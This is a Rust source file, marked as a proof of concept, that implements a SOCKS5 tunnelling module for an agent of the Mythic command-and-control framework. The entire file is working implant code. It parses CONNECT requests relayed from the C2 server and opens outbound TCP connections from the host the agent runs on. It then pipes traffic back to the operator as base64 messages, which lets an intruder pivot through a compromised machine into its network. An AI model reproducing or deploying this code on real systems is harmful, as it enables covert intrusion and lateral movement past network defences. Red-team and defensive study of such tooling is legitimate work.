// POC by Gerar
use crate::agent::AgentTask;
use crate::mythic_continued;

use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as tokio_mpsc;
use tokio::time::{timeout, Duration};

#[derive(Debug, Deserialize)]
struct SocksTask {
    port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct WireMsg {
    server_id: String,
    data: String, // base64
    #[serde(default)]
    exit: bool,
}

/// Build a SOCKS5 response using the socket's bound address if available.
fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00]; // VER, REP, RSV
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01); // ATYP IPv4
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04); // ATYP IPv6
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

/// Send a data packet to Mythic via socks_out.
fn send_data(
    tx: &std_mpsc::Sender<Value>,
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn Error>> {
    let packet = json!({
        "server_id": server_id,
        "data": encode(data),
        "exit": exit,
    });
    tx.send(packet)?;
    Ok(())
}

/// Parse the initial SOCKS5 CONNECT request (from Mythic payload).
fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
    if decoded.len() < 10 {
        return Err("SOCKS5 request too short".into());
    }
    if decoded[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }
    if decoded[1] != 0x01 {
        return Err("SOCKS5 command not supported (only CONNECT)".into());
    }

    match decoded[3] {
        0x01 => {
            // IPv4
            if decoded.len() < 10 {
                return Err("Malformed IPv4 CONNECT frame".into());
            }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port))
        }
        0x03 => {
            // Domain
            let len = decoded[4] as usize;
            let need = 5 + len + 2;
            if decoded.len() < need {
                return Err("Malformed domain CONNECT frame".into());
            }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
            Ok((domain, port))
        }
        0x04 => {
            // IPv6
            let need = 4 + 16 + 2;
            if decoded.len() < need {
                return Err("Malformed IPv6 CONNECT frame".into());
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port))
        }
        _ => Err("Unsupported ATYP in SOCKS5 request".into()),
    }
}

/// One SOCKS session: consume per-session messages and forward bytes.
async fn handle_connection(
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
    tx_out: std_mpsc::Sender<Value>,
) -> Result<(), Box<dyn Error>> {
    // Expect initial CONNECT frame
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => return Ok(()),
    };

    let decoded = decode(first["data"].as_str().unwrap_or(""))?;
    let (addr, port) = match parse_connect(&decoded) {
        Ok(v) => v,
        Err(_) => {
            let reply = build_reply(0x07, None); // Command not supported / malformed
            let _ = send_data(&tx_out, &server_id, &reply, true);
            return Ok(());
        }
    };

    // Connect to remote with timeout
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        _ => {
            let fail = build_reply(0x01, None);
            let _ = send_data(&tx_out, &server_id, &fail, true);
            return Ok(());
        }
    };

    // Send success reply w/ bound address
    let bound = remote.local_addr().ok();
    let ok = build_reply(0x00, bound);
    send_data(&tx_out, &server_id, &ok, false)?;

    // Split into owned halves
    let (mut remote_r, mut remote_w) = remote.into_split();

    // remote -> Mythic
    let tx_clone = tx_out.clone();
    let sid_clone = server_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        loop {
            match timeout(Duration::from_secs(300), remote_r.read(&mut buf)).await {
                Ok(Ok(0)) => {
                    let _ = send_data(&tx_clone, &sid_clone, b"", true);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        let _ = send_data(&tx_clone, &sid_clone, &buf[..n], false);
                    }
                }
                Ok(Err(_)) | Err(_) => {
                    let _ = send_data(&tx_clone, &sid_clone, b"", true);
                    break;
                }
            }
        }
    });

    // Mythic -> remote
    let m2a = tokio::spawn(async move {
        while let Some(msg) = sess_rx.recv().await {
            let m_sid = msg["server_id"].as_str().unwrap_or("");
            if m_sid != server_id {
                continue; // should not happen; dispatcher routes per-session
            }

            if msg["exit"].as_bool().unwrap_or(false) {
                let _ = AsyncWriteExt::shutdown(&mut remote_w).await;
                break;
            }

            if let Ok(data) = decode(msg["data"].as_str().unwrap_or("")) {
                if data.is_empty() {
                    continue;
                }
                let _ = timeout(Duration::from_secs(60), remote_w.write_all(&data)).await;
            }
        }
        let _ = AsyncWriteExt::shutdown(&mut remote_w).await;
    });

    // Wait for both directions to finish
    let _ = a2m.await;
    let _ = m2a.await;
    Ok(())
}

/// Main entry: bridge std mpsc -> Tokio mpsc, dispatch by server_id, spawn sessions.
pub fn handle_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // First message is the AgentTask
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    // Tell Mythic we're alive
    tx.send(mythic_continued!(
        task.id,
        "SOCKS handler active",
        "Awaiting SOCKS proxy data from Mythic"
    ))?;

    // Bridge std::mpsc (blocking) -> tokio::mpsc (async)
    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
    std::thread::spawn(move || {
        while let Ok(v) = rx.recv() {
            let _ = bridge_tx.send(v);
        }
    });

    // Start runtime and run dispatcher
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        // server_id -> session sender
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();

        while let Some(msg) = bridge_rx.recv().await {
            // Take owned copies BEFORE moving `msg` into `entry.send(msg)`
            let server_id = match msg.get("server_id").and_then(|v| v.as_str()) {
                Some(s) => s.to_string(),
                None => continue,
            };
            let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);

            // Lazily create a session for this server_id
            let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                let sid = server_id.clone();
                let tx_out = tx.clone();

                tokio::spawn(async move {
                    if let Err(_e) = handle_connection(sid, sess_rx, tx_out).await {
                        // optionally log
                    }
                });
                sess_tx
            });

            // Forward message to that session (moves `msg`)
            let _ = entry.send(msg);

            // If this message indicates exit, drop the route
            if exit {
                sessions.remove(&server_id);
            }
        }

        // Dispatcher channel closed: drop all sessions
        sessions.clear();
    });

    Ok(())
}

/// Keep old symbol name alive if other modules still call `socks::setup_socks`.
pub fn setup_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(tx, rx)
}
